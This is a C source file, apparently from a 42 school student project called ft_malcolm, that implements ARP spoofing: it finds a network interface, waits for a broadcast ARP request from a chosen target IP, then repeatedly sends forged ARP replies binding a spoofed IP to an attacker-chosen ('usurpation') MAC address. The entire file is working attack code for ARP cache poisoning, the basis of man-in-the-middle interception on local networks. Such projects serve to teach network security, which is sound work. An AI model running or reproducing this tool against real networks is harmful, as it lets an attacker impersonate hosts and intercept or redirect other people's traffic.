/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   process.c                                          :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: hubourge <hubourge@student.42angouleme.    +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2025/05/14 18:15:25 by hubourge          #+#    #+#             */
/*   Updated: 2025/05/19 19:40:24 by hubourge         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "ft_malcolm.h"

void get_arp_interfaces(t_malcolm *malcolm)
{
	struct ifaddrs *ifaddr, *ifa;

	// list of network interfaces
	if (getifaddrs(&ifaddr) == -1)
	{
		fprintf(stderr, "socket: %s\n", strerror(errno));
		free_all(EXIT_FAILURE, malcolm);
	}

	for (ifa = ifaddr; ifa != NULL; ifa = ifa->ifa_next)
	{
		if (ifa->ifa_addr == NULL)
			continue;

		// AF_PACKET only
		if (ifa->ifa_addr->sa_family == AF_PACKET \
			&& (ifa->ifa_flags & IFF_LOOPBACK) == 0 \
			&& (ifa->ifa_flags & IFF_UP))
		{
			printf("Found available interface : \n");
			printf("    - %s\n", ifa->ifa_name);
			malcolm->ifa_name = ft_strdup(ifa->ifa_name);
			if (!malcolm->ifa_name)
			{
				fprintf(stderr, "malloc: %s\n", strerror(errno));
				free_all(EXIT_FAILURE, malcolm);
			}
			malcolm->ifa_index = if_nametoindex(ifa->ifa_name);
			if (malcolm->ifa_index == 0)
			{
				fprintf(stderr, "if_nametoindex: %s\n", strerror(errno));
				free_all(EXIT_FAILURE, malcolm);
			}
		}
	}

	freeifaddrs(ifaddr);
}

void	listen_arp_requests(t_malcolm *malcolm, int sockfd)
{
	unsigned char buffer[MAX_BUFFER_SIZE];
	signal(SIGINT, handle_sigint);

	while (1)
	{
		check_sigint(malcolm);
		
		ssize_t len = recv(sockfd, buffer, sizeof(buffer), 0);
		if (len < 0)
		{
			fprintf(stderr, "recv: %s\n", strerror(errno));
			continue;
		}
			
		struct ether_header *eth = (struct ether_header *)buffer;

		// ARP packets only
		if (ntohs(eth->ether_type) != ETH_P_ARP)
		{
			fprintf(stderr, "Not an ARP packet\n");
			continue;
		}

		// Check broadcast
		if (ft_memcmp(eth->ether_dhost, "\xff\xff\xff\xff\xff\xff", 6) != 0)
		{
			fprintf(stderr, "Not a broadcast packet\n");
			continue;
		}

		struct ether_arp *arp = (struct ether_arp *)(buffer + sizeof(struct ether_header));

		// Check ARP request
		if (ntohs(arp->ea_hdr.ar_op) != ARPOP_REQUEST)
		{
			fprintf(stderr, "Not an ARP request\n");
			continue;
		}

		// Extract sender MAC/IP
		char			ip_str[INET_ADDRSTRLEN];
		unsigned char	*ip = arp->arp_spa;

		// Convert IP to string
		sprintf(ip_str, "%u.%u.%u.%u", ip[0], ip[1], ip[2], ip[3]);
		if (ft_strncmp(ip_str, malcolm->trgt_ip, INET_ADDRSTRLEN) != 0)
		{
			printf("Not the target IP: %s\n", ip_str);
			continue;
		}

		print_arp_request(arp, ip_str);
		break;
	}
}


int hexchar_to_int(char c) {
	if (c >= '0' && c <= '9') return c - '0';
	if (c >= 'a' && c <= 'f') return c - 'a' + 10;
	if (c >= 'A' && c <= 'F') return c - 'A' + 10;
	return 0; // jamais appelé si tu assumes que la MAC est toujours valide
}

void parse_mac(const char *str, uint8_t mac[6]) {
	for (int i = 0; i < 6; i++) {
		mac[i] = (hexchar_to_int(str[0]) << 4) | hexchar_to_int(str[1]);
		str += 3; // skip ':' too
	}
}


void	send_arp_reply(t_malcolm *malcolm, int sockfd)
{
	uint8_t packet[42]; // Ethernet (14) + ARP (28)
	struct ether_header	*eth = (struct ether_header *)packet;
	struct ether_arp	*arp = (struct ether_arp *)(packet + sizeof(struct ether_header));

	uint8_t src_mac[6], trgt_mac[6];
	parse_mac(malcolm->src_mac, src_mac);
	parse_mac(malcolm->trgt_mac, trgt_mac);

	// Ethernet header
	ft_memcpy(eth->ether_dhost, trgt_mac, 6);	// Destination = target MAC
	ft_memcpy(eth->ether_shost, src_mac, 6);	// Source = usurpation MAC
	eth->ether_type		= htons(ETHERTYPE_ARP);

	// ARP header
	arp->ea_hdr.ar_hrd	= htons(ARPHRD_ETHER);
	arp->ea_hdr.ar_pro	= htons(ETHERTYPE_IP);
	arp->ea_hdr.ar_hln	= 6;
	arp->ea_hdr.ar_pln	= 4;
	arp->ea_hdr.ar_op	= htons(ARPOP_REPLY);

	// Fill ARP header
	in_addr_t src_ip	= inet_addr(malcolm->src_ip);
	in_addr_t trgt_ip	= inet_addr(malcolm->trgt_ip);
	ft_memcpy(arp->arp_sha, src_mac, 6);	// source MAC
	ft_memcpy(arp->arp_spa, &src_ip, 4);	// source IP
	ft_memcpy(arp->arp_tha, trgt_mac, 6);	// target MAC
	ft_memcpy(arp->arp_tpa, &trgt_ip, 4);	// target IP
	
	// Fill packet with zeros
	struct sockaddr_ll sll;
	ft_memset(&sll, 0, sizeof(sll));

	// Fill sockaddr_ll struct
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = malcolm->ifa_index;
	sll.sll_halen = ETH_ALEN;
	ft_memcpy(sll.sll_addr, trgt_mac, 6);

	sleep(1);
	// Send the ARP reply
	if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		perror("sendto");
	else
		printf("Sent ARP reply: %s is-at %02x:%02x:%02x:%02x:%02x:%02x\n",
			malcolm->src_ip,
			src_mac[0], src_mac[1], src_mac[2],
			src_mac[3], src_mac[4], src_mac[5]);

	sleep(5);
	// Send the ARP reply
	if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		perror("sendto");
	else
		printf("Sent ARP reply: %s is-at %02x:%02x:%02x:%02x:%02x:%02x\n",
			malcolm->src_ip,
			src_mac[0], src_mac[1], src_mac[2],
			src_mac[3], src_mac[4], src_mac[5]);

	sleep(10);
	// Send the ARP reply
	if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		perror("sendto");
	else
		printf("Sent ARP reply: %s is-at %02x:%02x:%02x:%02x:%02x:%02x\n",
			malcolm->src_ip,
			src_mac[0], src_mac[1], src_mac[2],
			src_mac[3], src_mac[4], src_mac[5]);


	sleep(30);
	// Send the ARP reply
	if (sendto(sockfd, packet, sizeof(packet), 0, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		perror("sendto");
	else
		printf("Sent ARP reply: %s is-at %02x:%02x:%02x:%02x:%02x:%02x\n",
			malcolm->src_ip,
			src_mac[0], src_mac[1], src_mac[2],
			src_mac[3], src_mac[4], src_mac[5]);
}
